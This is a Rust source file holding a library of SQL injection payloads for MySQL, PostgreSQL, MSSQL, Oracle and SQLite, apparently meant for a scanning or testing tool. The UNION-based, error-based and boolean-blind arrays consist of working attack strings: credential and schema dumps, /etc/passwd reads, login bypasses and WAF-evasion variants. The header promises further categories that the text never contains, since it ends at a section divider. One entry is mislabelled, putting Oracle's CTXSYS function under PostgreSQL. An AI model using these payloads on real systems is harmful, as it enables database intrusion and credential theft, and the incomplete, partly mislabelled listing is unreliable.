/// Comprehensive SQL injection payload library covering UNION-based, error-based, boolean-blind,
/// time-based blind, stacked queries, out-of-band, and second-order techniques across MySQL,
/// PostgreSQL, MSSQL, Oracle, and SQLite. WAF bypass variants per technique. 200+ total payloads.

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum SqliCategory {
    UnionBased,
    ErrorBased,
    BooleanBlind,
    TimeBlind,
    StackedQuery,
    OutOfBand,
    SecondOrder,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum SqliDbms {
    MySQL,
    PostgreSQL,
    Mssql,
    Oracle,
    SQLite,
    Generic,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum SqliWafBypass {
    None,
    CommentInsertion,
    CaseVariation,
    EncodingBypass,
    WhitespaceAlternative,
    InlineComment,
    StringConcatenation,
    HexEncoding,
    DoubleEncoding,
    NullByte,
    ScientificNotation,
    JsonOperator,
}

#[derive(Debug, Clone)]
pub struct SqliPayload {
    pub payload: &'static str,
    pub category: SqliCategory,
    pub dbms: SqliDbms,
    pub waf_bypass: SqliWafBypass,
    pub description: &'static str,
}

impl SqliCategory {
    pub fn all() -> &'static [SqliCategory] {
        &[
            SqliCategory::UnionBased,
            SqliCategory::ErrorBased,
            SqliCategory::BooleanBlind,
            SqliCategory::TimeBlind,
            SqliCategory::StackedQuery,
            SqliCategory::OutOfBand,
            SqliCategory::SecondOrder,
        ]
    }
}

impl SqliDbms {
    pub fn all() -> &'static [SqliDbms] {
        &[
            SqliDbms::MySQL,
            SqliDbms::PostgreSQL,
            SqliDbms::Mssql,
            SqliDbms::Oracle,
            SqliDbms::SQLite,
            SqliDbms::Generic,
        ]
    }
}

// ---------------------------------------------------------------------------
// UNION-based payloads
// ---------------------------------------------------------------------------
const UNION_PAYLOADS: &[SqliPayload] = &[
    // MySQL UNION
    SqliPayload {
        payload: "' UNION SELECT NULL--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::None,
        description: "Single column NULL probe",
    },
    SqliPayload {
        payload: "' UNION SELECT NULL,NULL--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::None,
        description: "Two column NULL probe",
    },
    SqliPayload {
        payload: "' UNION SELECT NULL,NULL,NULL--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::None,
        description: "Three column NULL probe",
    },
    SqliPayload {
        payload: "' UNION SELECT 1,2,3,4,5--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::None,
        description: "Five column integer probe",
    },
    SqliPayload {
        payload: "' UNION SELECT table_name,NULL FROM information_schema.tables--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::None,
        description: "MySQL table enumeration",
    },
    SqliPayload {
        payload: "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::None,
        description: "MySQL column enumeration",
    },
    SqliPayload {
        payload: "' UNION SELECT username,password FROM users--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::None,
        description: "MySQL credential extraction",
    },
    SqliPayload {
        payload: "' UNION SELECT CONCAT(username,0x3a,password),NULL FROM users--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::None,
        description: "MySQL concat credential dump",
    },
    SqliPayload {
        payload: "' UNION SELECT GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::None,
        description: "MySQL group_concat all tables",
    },
    SqliPayload {
        payload: "' UNION SELECT @@version,NULL--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::None,
        description: "MySQL version extraction",
    },
    SqliPayload {
        payload: "' UNION SELECT user(),NULL--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::None,
        description: "MySQL current user",
    },
    SqliPayload {
        payload: "' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::None,
        description: "MySQL file read",
    },
    // PostgreSQL UNION
    SqliPayload {
        payload: "' UNION SELECT NULL--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::PostgreSQL,
        waf_bypass: SqliWafBypass::None,
        description: "PostgreSQL single column probe",
    },
    SqliPayload {
        payload: "' UNION SELECT version()--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::PostgreSQL,
        waf_bypass: SqliWafBypass::None,
        description: "PostgreSQL version",
    },
    SqliPayload {
        payload: "' UNION SELECT current_user--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::PostgreSQL,
        waf_bypass: SqliWafBypass::None,
        description: "PostgreSQL current user",
    },
    SqliPayload {
        payload: "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='public'--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::PostgreSQL,
        waf_bypass: SqliWafBypass::None,
        description: "PostgreSQL table enumeration",
    },
    SqliPayload {
        payload: "' UNION SELECT string_agg(table_name,',') FROM information_schema.tables--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::PostgreSQL,
        waf_bypass: SqliWafBypass::None,
        description: "PostgreSQL aggregate tables",
    },
    SqliPayload {
        payload: "' UNION SELECT pg_read_file('/etc/passwd')--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::PostgreSQL,
        waf_bypass: SqliWafBypass::None,
        description: "PostgreSQL file read",
    },
    // MSSQL UNION
    SqliPayload {
        payload: "' UNION SELECT NULL--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::Mssql,
        waf_bypass: SqliWafBypass::None,
        description: "MSSQL single column probe",
    },
    SqliPayload {
        payload: "' UNION SELECT @@version--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::Mssql,
        waf_bypass: SqliWafBypass::None,
        description: "MSSQL version",
    },
    SqliPayload {
        payload: "' UNION SELECT name FROM sysobjects WHERE xtype='U'--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::Mssql,
        waf_bypass: SqliWafBypass::None,
        description: "MSSQL table enumeration",
    },
    SqliPayload {
        payload: "' UNION SELECT DB_NAME()--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::Mssql,
        waf_bypass: SqliWafBypass::None,
        description: "MSSQL current database",
    },
    SqliPayload {
        payload: "' UNION SELECT SYSTEM_USER--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::Mssql,
        waf_bypass: SqliWafBypass::None,
        description: "MSSQL system user",
    },
    // Oracle UNION
    SqliPayload {
        payload: "' UNION SELECT NULL FROM dual--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::Oracle,
        waf_bypass: SqliWafBypass::None,
        description: "Oracle single column probe",
    },
    SqliPayload {
        payload: "' UNION SELECT banner FROM v$version WHERE ROWNUM=1--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::Oracle,
        waf_bypass: SqliWafBypass::None,
        description: "Oracle version extraction",
    },
    SqliPayload {
        payload: "' UNION SELECT table_name FROM all_tables--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::Oracle,
        waf_bypass: SqliWafBypass::None,
        description: "Oracle table enumeration",
    },
    SqliPayload {
        payload: "' UNION SELECT username FROM all_users--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::Oracle,
        waf_bypass: SqliWafBypass::None,
        description: "Oracle user enumeration",
    },
    SqliPayload {
        payload: "' UNION SELECT UTL_INADDR.get_host_address FROM dual--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::Oracle,
        waf_bypass: SqliWafBypass::None,
        description: "Oracle host address",
    },
    // SQLite UNION
    SqliPayload {
        payload: "' UNION SELECT NULL--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::SQLite,
        waf_bypass: SqliWafBypass::None,
        description: "SQLite single column probe",
    },
    SqliPayload {
        payload: "' UNION SELECT sqlite_version()--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::SQLite,
        waf_bypass: SqliWafBypass::None,
        description: "SQLite version",
    },
    SqliPayload {
        payload: "' UNION SELECT name FROM sqlite_master WHERE type='table'--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::SQLite,
        waf_bypass: SqliWafBypass::None,
        description: "SQLite table enumeration",
    },
    SqliPayload {
        payload: "' UNION SELECT sql FROM sqlite_master--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::SQLite,
        waf_bypass: SqliWafBypass::None,
        description: "SQLite schema dump",
    },
    // WAF bypass UNION
    SqliPayload {
        payload: "' /*!UNION*/ /*!SELECT*/ NULL--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::InlineComment,
        description: "MySQL inline comment bypass",
    },
    SqliPayload {
        payload: "' UnIoN SeLeCt NULL--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::Generic,
        waf_bypass: SqliWafBypass::CaseVariation,
        description: "Mixed case UNION SELECT",
    },
    SqliPayload {
        payload: "' UNION%09SELECT%09NULL--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::Generic,
        waf_bypass: SqliWafBypass::WhitespaceAlternative,
        description: "Tab whitespace bypass",
    },
    SqliPayload {
        payload: "' UNION%0ASELECT%0ANULL--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::Generic,
        waf_bypass: SqliWafBypass::WhitespaceAlternative,
        description: "Newline whitespace bypass",
    },
    SqliPayload {
        payload: "' UNION/**/SELECT/**/NULL--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::Generic,
        waf_bypass: SqliWafBypass::CommentInsertion,
        description: "Comment whitespace bypass",
    },
    SqliPayload {
        payload: "' %55NION %53ELECT NULL--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::Generic,
        waf_bypass: SqliWafBypass::EncodingBypass,
        description: "URL-encoded keyword bypass",
    },
    SqliPayload {
        payload: "' /*!50000UNION*/ /*!50000SELECT*/ NULL--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::InlineComment,
        description: "MySQL versioned comment bypass",
    },
    SqliPayload {
        payload: "' UNION(SELECT(NULL))--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::Generic,
        waf_bypass: SqliWafBypass::WhitespaceAlternative,
        description: "Parenthesis whitespace bypass",
    },
    SqliPayload {
        payload: "' UNION SELECT schema_name FROM information_schema.schemata--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::None,
        description: "MySQL schema enumeration",
    },
    SqliPayload {
        payload: "' UNION SELECT grantee FROM information_schema.user_privileges--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::None,
        description: "MySQL privilege enumeration",
    },
    SqliPayload {
        payload: "' UNION SELECT host,user FROM mysql.user--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::None,
        description: "MySQL user table dump",
    },
    SqliPayload {
        payload: "' UNION SELECT variable_value FROM information_schema.global_variables WHERE variable_name='datadir'--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::None,
        description: "MySQL datadir extraction",
    },
    SqliPayload {
        payload: "' UNION SELECT table_name FROM information_schema.columns WHERE column_name LIKE '%pass%'--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::None,
        description: "MySQL find password columns",
    },
    SqliPayload {
        payload: "' UNION SELECT rolname FROM pg_roles--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::PostgreSQL,
        waf_bypass: SqliWafBypass::None,
        description: "PostgreSQL role enumeration",
    },
    SqliPayload {
        payload: "' UNION SELECT datname FROM pg_database--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::PostgreSQL,
        waf_bypass: SqliWafBypass::None,
        description: "PostgreSQL database enumeration",
    },
    SqliPayload {
        payload: "' UNION SELECT setting FROM pg_settings WHERE name='data_directory'--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::PostgreSQL,
        waf_bypass: SqliWafBypass::None,
        description: "PostgreSQL data directory",
    },
    SqliPayload {
        payload: "' UNION SELECT name FROM master..sysdatabases--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::Mssql,
        waf_bypass: SqliWafBypass::None,
        description: "MSSQL database enumeration",
    },
    SqliPayload {
        payload: "' UNION SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::Mssql,
        waf_bypass: SqliWafBypass::None,
        description: "MSSQL column enumeration",
    },
    SqliPayload {
        payload: "' UNION SELECT tbl_name FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%'--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::SQLite,
        waf_bypass: SqliWafBypass::None,
        description: "SQLite non-system table list",
    },
    SqliPayload {
        payload: "' UNION SELECT group_concat(name) FROM pragma_table_info('users')--",
        category: SqliCategory::UnionBased,
        dbms: SqliDbms::SQLite,
        waf_bypass: SqliWafBypass::None,
        description: "SQLite pragma table info",
    },
];

// ---------------------------------------------------------------------------
// Error-based payloads
// ---------------------------------------------------------------------------
const ERROR_PAYLOADS: &[SqliPayload] = &[
    // MySQL error
    SqliPayload {
        payload: "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
        category: SqliCategory::ErrorBased,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::None,
        description: "MySQL EXTRACTVALUE error",
    },
    SqliPayload {
        payload: "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--",
        category: SqliCategory::ErrorBased,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::None,
        description: "MySQL UPDATEXML error",
    },
    SqliPayload {
        payload: "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        category: SqliCategory::ErrorBased,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::None,
        description: "MySQL double query error",
    },
    SqliPayload {
        payload: "' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(version()) FROM dual) USING utf8)))--",
        category: SqliCategory::ErrorBased,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::None,
        description: "MySQL JSON_KEYS error",
    },
    SqliPayload {
        payload: "' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version()),0x7e),1)--",
        category: SqliCategory::ErrorBased,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::None,
        description: "MySQL GTID_SUBSET error",
    },
    SqliPayload {
        payload: "' AND EXP(~(SELECT * FROM (SELECT version())a))--",
        category: SqliCategory::ErrorBased,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::None,
        description: "MySQL EXP overflow error",
    },
    SqliPayload {
        payload: "' AND ST_LatFromGeoHash((SELECT version()))--",
        category: SqliCategory::ErrorBased,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::None,
        description: "MySQL GeoHash error",
    },
    // PostgreSQL error
    SqliPayload {
        payload: "' AND 1=CAST((SELECT version()) AS int)--",
        category: SqliCategory::ErrorBased,
        dbms: SqliDbms::PostgreSQL,
        waf_bypass: SqliWafBypass::None,
        description: "PostgreSQL CAST error",
    },
    SqliPayload {
        payload: "' AND 1=CAST(CHR(126)||version()||CHR(126) AS NUMERIC)--",
        category: SqliCategory::ErrorBased,
        dbms: SqliDbms::PostgreSQL,
        waf_bypass: SqliWafBypass::None,
        description: "PostgreSQL CHR CAST error",
    },
    SqliPayload {
        payload: "',CTXSYS.DRITHSX.SN(1,(SELECT version()))--",
        category: SqliCategory::ErrorBased,
        dbms: SqliDbms::PostgreSQL,
        waf_bypass: SqliWafBypass::None,
        description: "PostgreSQL error-based extraction",
    },
    // MSSQL error
    SqliPayload {
        payload: "' AND 1=CONVERT(int,(SELECT @@version))--",
        category: SqliCategory::ErrorBased,
        dbms: SqliDbms::Mssql,
        waf_bypass: SqliWafBypass::None,
        description: "MSSQL CONVERT error",
    },
    SqliPayload {
        payload: "' AND 1=CONCAT('',(SELECT @@version))--",
        category: SqliCategory::ErrorBased,
        dbms: SqliDbms::Mssql,
        waf_bypass: SqliWafBypass::None,
        description: "MSSQL CONCAT type error",
    },
    SqliPayload {
        payload: "' AND 1 IN (SELECT @@version)--",
        category: SqliCategory::ErrorBased,
        dbms: SqliDbms::Mssql,
        waf_bypass: SqliWafBypass::None,
        description: "MSSQL IN subquery error",
    },
    SqliPayload {
        payload: "' HAVING 1=1--",
        category: SqliCategory::ErrorBased,
        dbms: SqliDbms::Mssql,
        waf_bypass: SqliWafBypass::None,
        description: "MSSQL HAVING column leak",
    },
    SqliPayload {
        payload: "' GROUP BY columnname HAVING 1=1--",
        category: SqliCategory::ErrorBased,
        dbms: SqliDbms::Mssql,
        waf_bypass: SqliWafBypass::None,
        description: "MSSQL GROUP BY column leak",
    },
    // Oracle error
    SqliPayload {
        payload: "' AND 1=UTL_INADDR.get_host_name((SELECT banner FROM v$version WHERE ROWNUM=1))--",
        category: SqliCategory::ErrorBased,
        dbms: SqliDbms::Oracle,
        waf_bypass: SqliWafBypass::None,
        description: "Oracle UTL_INADDR error",
    },
    SqliPayload {
        payload: "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--",
        category: SqliCategory::ErrorBased,
        dbms: SqliDbms::Oracle,
        waf_bypass: SqliWafBypass::None,
        description: "Oracle CTXSYS error",
    },
    SqliPayload {
        payload: "' AND 1=DBMS_UTILITY.SQLID_TO_SQLHASH((SELECT banner FROM v$version WHERE ROWNUM=1))--",
        category: SqliCategory::ErrorBased,
        dbms: SqliDbms::Oracle,
        waf_bypass: SqliWafBypass::None,
        description: "Oracle DBMS_UTILITY error",
    },
    // SQLite error
    SqliPayload {
        payload: "' AND 1=CAST((SELECT sqlite_version()) AS int)--",
        category: SqliCategory::ErrorBased,
        dbms: SqliDbms::SQLite,
        waf_bypass: SqliWafBypass::None,
        description: "SQLite CAST error",
    },
    SqliPayload {
        payload: "' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000))))--",
        category: SqliCategory::ErrorBased,
        dbms: SqliDbms::SQLite,
        waf_bypass: SqliWafBypass::None,
        description: "SQLite heavy query error",
    },
    // WAF bypass error-based
    SqliPayload {
        payload: "' /*!AND*/ EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
        category: SqliCategory::ErrorBased,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::InlineComment,
        description: "MySQL comment-wrapped EXTRACTVALUE",
    },
    SqliPayload {
        payload: "' AND/**/UPDATEXML(1,CONCAT(0x7e,version()),1)--",
        category: SqliCategory::ErrorBased,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::CommentInsertion,
        description: "MySQL comment UPDATEXML bypass",
    },
    SqliPayload {
        payload: "' AND 1=CONVERT(int,0x61)--",
        category: SqliCategory::ErrorBased,
        dbms: SqliDbms::Mssql,
        waf_bypass: SqliWafBypass::HexEncoding,
        description: "MSSQL hex CONVERT error",
    },
    SqliPayload {
        payload: "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@basedir))--",
        category: SqliCategory::ErrorBased,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::None,
        description: "MySQL basedir via EXTRACTVALUE",
    },
    SqliPayload {
        payload: "' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))x)--",
        category: SqliCategory::ErrorBased,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::None,
        description: "MySQL NAME_CONST duplicate error",
    },
    SqliPayload {
        payload: "' AND POLYGON((SELECT * FROM (SELECT * FROM (SELECT version())a)b))--",
        category: SqliCategory::ErrorBased,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::None,
        description: "MySQL POLYGON geometry error",
    },
    SqliPayload {
        payload: "' AND LINESTRING((SELECT * FROM (SELECT * FROM (SELECT version())a)b))--",
        category: SqliCategory::ErrorBased,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::None,
        description: "MySQL LINESTRING geometry error",
    },
    SqliPayload {
        payload: "' AND MULTIPOINT((SELECT * FROM (SELECT * FROM (SELECT version())a)b))--",
        category: SqliCategory::ErrorBased,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::None,
        description: "MySQL MULTIPOINT geometry error",
    },
    SqliPayload {
        payload: "' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x LIMIT 1)--",
        category: SqliCategory::ErrorBased,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::None,
        description: "MySQL ROW subquery error",
    },
];

// ---------------------------------------------------------------------------
// Boolean blind payloads
// ---------------------------------------------------------------------------
const BOOLEAN_BLIND_PAYLOADS: &[SqliPayload] = &[
    SqliPayload {
        payload: "' AND 1=1--",
        category: SqliCategory::BooleanBlind,
        dbms: SqliDbms::Generic,
        waf_bypass: SqliWafBypass::None,
        description: "Boolean true baseline",
    },
    SqliPayload {
        payload: "' AND 1=2--",
        category: SqliCategory::BooleanBlind,
        dbms: SqliDbms::Generic,
        waf_bypass: SqliWafBypass::None,
        description: "Boolean false baseline",
    },
    SqliPayload {
        payload: "' AND SUBSTRING(version(),1,1)='5'--",
        category: SqliCategory::BooleanBlind,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::None,
        description: "MySQL version probe char 1",
    },
    SqliPayload {
        payload: "' AND (SELECT COUNT(*) FROM information_schema.tables)>10--",
        category: SqliCategory::BooleanBlind,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::None,
        description: "MySQL table count probe",
    },
    SqliPayload {
        payload: "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--",
        category: SqliCategory::BooleanBlind,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::None,
        description: "MySQL binary search database name",
    },
    SqliPayload {
        payload: "' AND (SELECT LENGTH(table_name) FROM information_schema.tables LIMIT 1)>5--",
        category: SqliCategory::BooleanBlind,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::None,
        description: "MySQL table name length probe",
    },
    SqliPayload {
        payload: "' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",
        category: SqliCategory::BooleanBlind,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::None,
        description: "MySQL credential char extraction",
    },
    SqliPayload {
        payload: "' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)=1--",
        category: SqliCategory::BooleanBlind,
        dbms: SqliDbms::Generic,
        waf_bypass: SqliWafBypass::None,
        description: "CASE-based boolean probe",
    },
    SqliPayload {
        payload: "' AND (SELECT ASCII(SUBSTRING(current_user,1,1)))>64--",
        category: SqliCategory::BooleanBlind,
        dbms: SqliDbms::PostgreSQL,
        waf_bypass: SqliWafBypass::None,
        description: "PostgreSQL user char probe",
    },
    SqliPayload {
        payload: "' AND (SELECT COUNT(*) FROM pg_tables WHERE schemaname='public')>0--",
        category: SqliCategory::BooleanBlind,
        dbms: SqliDbms::PostgreSQL,
        waf_bypass: SqliWafBypass::None,
        description: "PostgreSQL table existence",
    },
    SqliPayload {
        payload: "' AND UNICODE(SUBSTRING((SELECT DB_NAME()),1,1))>64--",
        category: SqliCategory::BooleanBlind,
        dbms: SqliDbms::Mssql,
        waf_bypass: SqliWafBypass::None,
        description: "MSSQL database name probe",
    },
    SqliPayload {
        payload: "' AND (SELECT COUNT(*) FROM sysobjects WHERE xtype='U')>5--",
        category: SqliCategory::BooleanBlind,
        dbms: SqliDbms::Mssql,
        waf_bypass: SqliWafBypass::None,
        description: "MSSQL table count probe",
    },
    SqliPayload {
        payload: "' AND (SELECT ASCII(SUBSTR(banner,1,1)) FROM v$version WHERE ROWNUM=1)>64--",
        category: SqliCategory::BooleanBlind,
        dbms: SqliDbms::Oracle,
        waf_bypass: SqliWafBypass::None,
        description: "Oracle version char probe",
    },
    SqliPayload {
        payload: "' AND (SELECT UNICODE(SUBSTR(name,1,1)) FROM sqlite_master LIMIT 1)>64--",
        category: SqliCategory::BooleanBlind,
        dbms: SqliDbms::SQLite,
        waf_bypass: SqliWafBypass::None,
        description: "SQLite table name char probe",
    },
    SqliPayload {
        payload: "' AND 1=1 AND 'a'='a",
        category: SqliCategory::BooleanBlind,
        dbms: SqliDbms::Generic,
        waf_bypass: SqliWafBypass::None,
        description: "String-terminated true",
    },
    SqliPayload {
        payload: "' OR 1=1--",
        category: SqliCategory::BooleanBlind,
        dbms: SqliDbms::Generic,
        waf_bypass: SqliWafBypass::None,
        description: "OR-based authentication bypass",
    },
    SqliPayload {
        payload: "' OR ''='",
        category: SqliCategory::BooleanBlind,
        dbms: SqliDbms::Generic,
        waf_bypass: SqliWafBypass::None,
        description: "Empty-string true condition",
    },
    SqliPayload {
        payload: "admin'--",
        category: SqliCategory::BooleanBlind,
        dbms: SqliDbms::Generic,
        waf_bypass: SqliWafBypass::None,
        description: "Admin bypass comment",
    },
    SqliPayload {
        payload: "' AND IF(1=1,'a','b')='a'--",
        category: SqliCategory::BooleanBlind,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::None,
        description: "MySQL IF-based boolean",
    },
    SqliPayload {
        payload: "' AND (SELECT CASE WHEN (username='admin') THEN 'a' ELSE 'b' END FROM users LIMIT 1)='a'--",
        category: SqliCategory::BooleanBlind,
        dbms: SqliDbms::Generic,
        waf_bypass: SqliWafBypass::None,
        description: "Conditional data extraction",
    },
    // WAF bypass boolean
    SqliPayload {
        payload: "' /*!AND*/ 1=1--",
        category: SqliCategory::BooleanBlind,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::InlineComment,
        description: "Inline comment AND bypass",
    },
    SqliPayload {
        payload: "' AND/**/ 1=1--",
        category: SqliCategory::BooleanBlind,
        dbms: SqliDbms::Generic,
        waf_bypass: SqliWafBypass::CommentInsertion,
        description: "Comment-separated AND",
    },
    SqliPayload {
        payload: "' %26%26 1=1--",
        category: SqliCategory::BooleanBlind,
        dbms: SqliDbms::Generic,
        waf_bypass: SqliWafBypass::EncodingBypass,
        description: "URL-encoded && operator",
    },
    SqliPayload {
        payload: "' AND 1 LIKE 1--",
        category: SqliCategory::BooleanBlind,
        dbms: SqliDbms::Generic,
        waf_bypass: SqliWafBypass::WhitespaceAlternative,
        description: "LIKE instead of equals",
    },
    SqliPayload {
        payload: "' AND 1 REGEXP 1--",
        category: SqliCategory::BooleanBlind,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::WhitespaceAlternative,
        description: "REGEXP instead of equals",
    },
    SqliPayload {
        payload: "' AND NOT 1=0--",
        category: SqliCategory::BooleanBlind,
        dbms: SqliDbms::Generic,
        waf_bypass: SqliWafBypass::None,
        description: "NOT negation true",
    },
    SqliPayload {
        payload: "' AND (SELECT HEX(SUBSTR(password,1,1)) FROM users LIMIT 1)>'40'--",
        category: SqliCategory::BooleanBlind,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::None,
        description: "MySQL hex comparison extraction",
    },
    SqliPayload {
        payload: "' AND (SELECT BIT_LENGTH(username) FROM users LIMIT 1)>40--",
        category: SqliCategory::BooleanBlind,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::None,
        description: "MySQL bit_length probe",
    },
    SqliPayload {
        payload: "' AND ORD(MID(version(),1,1))>50--",
        category: SqliCategory::BooleanBlind,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::None,
        description: "MySQL ORD/MID char probe",
    },
    SqliPayload {
        payload: "' AND LEFT(version(),1)>'4'--",
        category: SqliCategory::BooleanBlind,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::None,
        description: "MySQL LEFT comparison",
    },
    SqliPayload {
        payload: "' AND BINARY SUBSTRING(version(),1,1)='5'--",
        category: SqliCategory::BooleanBlind,
        dbms: SqliDbms::MySQL,
        waf_bypass: SqliWafBypass::None,
        description: "MySQL BINARY case-sensitive comparison",
    },
    SqliPayload {
        payload: "' AND (SELECT SUBSTR(version(),1,1))::int>4--",
        category: SqliCategory::BooleanBlind,
        dbms: SqliDbms::PostgreSQL,
        waf_bypass: SqliWafBypass::None,
        description: "PostgreSQL cast substring comparison",
    },
    SqliPayload {
        payload: "' AND EXISTS(SELECT 1 FROM users WHERE username='admin')--",
        category: SqliCategory::BooleanBlind,
        dbms: SqliDbms::Generic,
        waf_bypass: SqliWafBypass::None,
        description: "EXISTS subquery boolean",
    },
    SqliPayload {
        payload: "' AND (SELECT TOP 1 LEN(username) FROM users)>3--",
        category: SqliCategory::BooleanBlind,
        dbms: SqliDbms::Mssql,
        waf_bypass: SqliWafBypass::None,
        description: "MSSQL TOP LEN probe",
    },
];

// ---------------------------------------------------------------------------
